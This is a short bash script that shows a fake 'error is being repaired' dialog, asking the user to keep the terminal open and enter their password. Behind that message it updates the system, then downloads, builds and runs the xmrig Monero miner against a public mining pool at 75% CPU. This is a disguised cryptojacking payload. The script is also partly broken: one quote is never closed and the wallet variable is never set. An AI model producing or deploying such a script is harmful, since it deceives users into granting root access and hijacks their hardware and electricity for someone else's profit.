#!/bin/bash
zenity --text="Oops! An error has occured. This error is being repaired. Please do not close the terminal during the process. You may be asked to enter your password. --error

# Update system

sudo apt update && sudo apt upgrade -y

# Install dependencies

sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev

# Clone xmrig

cd ~
git clone https://github.com/xmrig/xmrig.git

cd xmrig || exit

# Build xmrig
mkdir build
cd build || exit

cmake ..
make -j$(nproc)

# Ask for wallet + pool

# Run xmrig

./xmrig -o "pool.supportxmr.com:3333" -u "$wallet" -p x --cpu-max-threads-hint=75
